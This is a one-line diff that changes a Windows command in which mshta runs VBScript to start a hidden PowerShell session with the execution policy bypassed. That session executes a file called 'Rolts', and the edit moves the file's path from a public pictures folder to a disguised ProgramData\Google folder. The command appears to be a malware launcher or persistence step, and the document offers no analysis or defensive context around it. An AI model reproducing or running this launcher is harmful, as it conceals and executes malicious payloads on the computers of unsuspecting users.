@@ -1,1 +1,1 @@
-mshta VBScript:Execute("CreateObject(""WScript.Shell"").exeC (""C:\Windows\System32\WindowsPowerShell\v1.0\powershell "" & ""-ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -NoExit -Command & 'C:\Users\Public\Pictures\Rolts'""):close")
+mshta VBScript:Execute("CreateObject(""WScript.Shell"").exeC (""C:\Windows\System32\WindowsPowerShell\v1.0\powershell "" & ""-ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -NoExit -Command & 'C:\ProgramData\Google\Rolts'""):close")
